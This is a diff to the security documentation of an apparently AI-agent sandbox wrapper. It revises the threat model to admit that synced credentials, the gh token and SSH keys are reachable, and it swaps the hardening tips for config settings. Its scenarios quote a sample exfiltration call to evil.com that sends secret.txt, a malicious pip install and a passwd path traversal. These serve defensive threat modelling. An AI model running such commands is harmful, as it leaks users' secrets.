@@ -37,7 +37,9 @@ the directory stays stable. `/` is refused as a workspace.
 
 **Prevents**:
 - ✅ `../../../etc/passwd` - Cannot traverse outside mount
-- ✅ `~/sensitive-file` - Only workspace accessible
+- ✅ `~/sensitive-file` - No host path is reachable beyond the workspace and
+  what is deliberately mounted or synced in (sessions, clipboard spool, the
+  credentials and git/gh/ssh state listed under "Host secrets passed through")
 - ✅ Moving files outside workspace - Mount boundary enforced by kernel
 
 **How It Works**:
@@ -56,6 +58,7 @@ the directory stays stable. `/` is refused as a workspace.
 -v sagent-rootfs:/home/agent:rw \
 -v sagent-npm:/home/agent/.npm-global:rw \
 -v sagent-pip:/home/agent/.local:rw \
+-v sagent-share:/home/agent/.local/share:rw \
 -v sagent-apt-cache:/var/cache/apt:rw \
 -v sagent-apt-lists:/var/lib/apt/lists:rw \
 -v sagent-containers:/home/agent/.local/share/containers:rw
@@ -433,7 +436,10 @@ requests.post('https://evil.com', files={'data': open('secret.txt')})
 **Mitigation**:
 - ⚠️ **PARTIALLY MITIGATED**:
   - Can exfiltrate workspace files (inherent tradeoff)
-  - Cannot access SSH keys or credentials outside workspace, except auth/config files intentionally synced into `sclaude-config` or `scodex-config`
+  - Can exfiltrate what is synced in: the Claude/Codex credentials, the gh
+    token, and — with `SAGENT_GIT_PROTOCOL=ssh`, the default when your gh
+    uses ssh — your SSH private keys. `SAGENT_GIT_PROTOCOL=https` keeps the
+    keys out; nothing else on the host is reachable
   - Network access needed for package management
 
 **Best Practices**:
@@ -449,16 +455,17 @@ pip install evil-package
 ```
 
 **Mitigation**:
-- ✅ **PARTIALLY MITIGATED**:
+- ⚠️ **PARTIALLY MITIGATED**:
   - Runs as non-root
   - Container is ephemeral
-  - No access to host files
+  - No host files beyond the workspace and what is synced in
   - Limited by capabilities
 
 **Blast Radius**:
-- Can affect workspace
-- Cannot persist to system
-- Cannot access SSH keys
+- Can affect the workspace and the persistent volumes (installed packages,
+  the sandbox home)
+- Cannot persist to the host system
+- Reaches synced secrets: see Scenario 6
 
 ## Known Limitations
 
@@ -513,36 +520,22 @@ pip install evil-package
 - [ ] Audit dependencies
 - [ ] Commit or revert
 
-## Hardening Recommendations
+## What you can tighten
 
-### Maximum Security
+Every knob is a setting in `~/.config/sagent/config` (or the environment):
 
-1. **Disable network**:
-```bash
---network none
-```
+| Setting | Effect |
+|---|---|
+| `SAGENT_DOCKER=0` | No nested containers: the default seccomp profile and AppArmor stay on, no `/dev/fuse` or `/dev/net/tun`, PID limit 100 |
+| `SAGENT_GIT_PROTOCOL=https` | No SSH keys enter the sandbox; git uses the gh token over HTTPS |
+| `SAGENT_SESSIONS=0` | No transcripts shared; a session started inside stays inside |
+| `SAGENT_CLIPBOARD=0` | The sandbox cannot read the host clipboard |
+| `MEMORY_LIMIT`, `CPU_LIMIT`, `PIDS_LIMIT` | Smaller than the 4g / 2 / 100 defaults |
 
-2. **Read-only workspace** (analysis only):
-```bash
--v "$WORKSPACE_PATH:$WORKSPACE_PATH:ro"
-```
-
-3. **Reduce resource limits**:
-```bash
-MEMORY_LIMIT="2g"
-CPU_LIMIT="1"
-PIDS_LIMIT="50"
-```
-
-4. **Add AppArmor profile**:
-```bash
---security-opt apparmor=docker-default
-```
-
-5. **Use gVisor runtime**:
-```bash
---runtime=runsc
-```
+Not available: a run without network, a read-only workspace, or another
+runtime (gVisor). The wrapper builds the `docker run` command itself and has
+no pass-through for extra flags; log `gh` out on the host if the token should
+not travel either.
 
 ## Scope
 
